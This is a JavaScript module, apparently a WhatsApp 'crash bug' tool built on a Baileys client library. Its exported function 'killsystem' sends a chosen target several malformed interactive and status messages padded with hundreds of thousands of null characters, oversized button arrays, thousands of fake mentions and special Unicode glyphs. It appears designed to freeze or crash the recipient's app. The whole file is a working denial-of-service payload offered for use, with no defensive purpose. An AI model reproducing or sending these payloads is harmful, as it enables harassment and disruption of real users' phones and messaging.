const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, proto, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto')

async function killsystem(sock, target) {
    const bokep1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " "
                    },
                    nativeFlowMessage: {
                        buttons: "\u0000".repeat(500000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, bokep1, {
        noSelfSync: true
    });

    const bokep2 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " "
                    },
                    nativeFlowMessage: {
                        buttons: "\u0000".repeat(500000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, bokep2, {
        noSelfSync: true
    });

    const msg1 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u0000".repeat(50000) + "Rena4You𑇂𑆵𑆴𑆿" + "\u0000".repeat(50000)
                    },
                    nativeFlowMessage: {
                        extra: "\u0000".repeat(50000),
                        buttons: "A".repeat(20000)
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg1, {
        noSelfSync: true
    });

    const msg2 = {
        interactiveMessage: {
            body: {
                text: "Rena4You𑇂𑆵𑆴𑆿"
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({}))
            }
        }
    };

    await sock.relayMessage(target, msg2, {
        noSelfSync: true
    });

    const msg3 = {
        interactiveMessage: {
            body: {
                text: "Rena4You𑇂𑆵𑆴𑆿𑆿"
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 1000 }, () => ({}))
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 2000 }, () =>
                    Math.floor(Math.random() * 9000000000) + "@s.whatsapp.net"
                ),
                forwardingScore: 999999999,
                isForwarded: true
            }
        }
    };

    await sock.relayMessage(target, msg3, {
        noSelfSync: true
    });

    const message = {
        interactiveMessage: {
            body: {
                text: "\u0000".repeat(60000)
            },
            nativeFlowMessage: {
                buttons: "view_ai_message".repeat(30000)
            }
        }
    };

    await sock.relayMessage(target, message, {
        noSelfSync: true
    });
}

module.exports = { killsystem };
